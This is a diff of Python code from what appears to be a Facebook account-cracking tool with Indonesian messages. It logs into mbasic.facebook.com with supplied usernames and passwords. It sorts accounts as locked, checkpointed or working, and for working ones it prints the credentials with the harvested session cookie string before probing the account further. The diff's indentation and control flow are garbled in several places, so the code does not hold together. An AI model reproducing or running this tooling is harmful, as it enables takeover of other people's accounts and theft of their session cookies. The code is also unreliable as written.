@@ -522,23 +522,24 @@ def log_hasil(user, pasw):
     urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
     response=par(urlPost.text, "html.parser")
     if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):print("[!] Nyalakan lalu matikan mode pesawat selama 2 Detik.")
-    if "c_user" in session.cookies.get_dict():if "Akun Anda Dikunci" in urlPost.text:
+    if "c_user" in session.cookies.get_dict():
+    if "Akun Anda Dikunci" in urlPost.text:
     if self.satua==True:
       print(f"{P}[CP] {self.user} | {self.pw}",end="")
       print(f"\r[×] Akun sesi new\n\n",end="")
-      else:
+    else:
         aman+=1
         coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-        if self.satua==True:print(f"\r{H}[OK] {self.user}|{self.pw}|{coki}{P}        ",end="")
+    if self.satua==True:print(f"\r{H}[OK] {self.user}|{self.pw}|{coki}{P}        ",end="")
         print(f"\r{H}[√] Akun Aman{P}\n[{K}={P}] Cookie: {BM}{coki}{P}\n",end="")
         self.get_info(session,coki)
         self.cek_apk(session,coki)
-        elif "checkpoint" in session.cookies.get_dict():cp+=1
+    elif "checkpoint" in session.cookies.get_dict():cp+=1
         title=re.findall("\<title>(.*?)<\/title>",str(response))
         link2=response.find("form",{"method":"post"})
         listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
-        for x in response("input"):
-          if x.get("name") in listInput:
+    for x in response("input"):
+      if x.get("name") in listInput:
             data2.update({x.get("name"):x.get("value")})
             an=session.post(self.url+link2.get("action"),data=data2)
             response2=par(an.text,"html.parser")
